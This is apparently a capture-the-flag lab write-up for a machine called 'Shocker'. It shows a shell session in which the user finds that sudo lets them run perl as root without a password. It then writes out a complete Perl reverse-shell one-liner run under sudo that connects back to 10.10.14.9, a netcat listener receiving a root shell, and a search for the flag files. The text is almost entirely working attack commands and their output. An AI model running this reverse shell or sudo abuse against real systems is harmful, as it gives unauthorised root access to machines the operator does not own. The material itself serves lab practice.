## Checking permissions
```
meterpreter > shell
Process 11751 created.
Channel 1 created.
whoami
shelly
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

## Perl reverse shell
```
shelly@Shocker:/dev/shm$ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.9";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
<n(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
```

### listener
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337                   
listening on [any] 1337 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.56] 56922
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 

###### After elevating shell...
root@Shocker:/dev/shm# find / -name user.txt
/home/shelly/user.txt
root@Shocker:/dev/shm# find / -name root.txt
/root/root.txt

```